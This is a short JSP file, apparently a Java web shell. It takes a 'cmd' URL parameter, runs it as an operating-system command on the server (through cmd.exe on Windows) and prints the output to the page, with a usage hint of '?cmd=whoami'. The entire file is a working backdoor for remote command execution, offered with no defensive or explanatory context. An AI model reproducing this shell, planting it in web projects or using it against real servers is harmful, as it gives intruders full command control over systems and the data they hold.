<%@ page language="java" import="java.util.*,java.io.*,java.net.*" pageEncoding="gb2312"%>
<%
String cmd = request.getParameter("cmd");
String output = "";
Process p = null;
	
if(cmd == null) {
    out.println( "USG:<br>"+"?cmd=whoami" );
}
else
{
	String s = null;
	try {
		if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1) 
		{
			p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
		}
		else
		{
			p = Runtime.getRuntime().exec( cmd );	
		}
		BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
		while((s = sI.readLine()) != null)
		{
			out.print(s + "<br>");
		}		
		}
		catch(IOException e)
		{
			out.println( e );
	    }
}
%>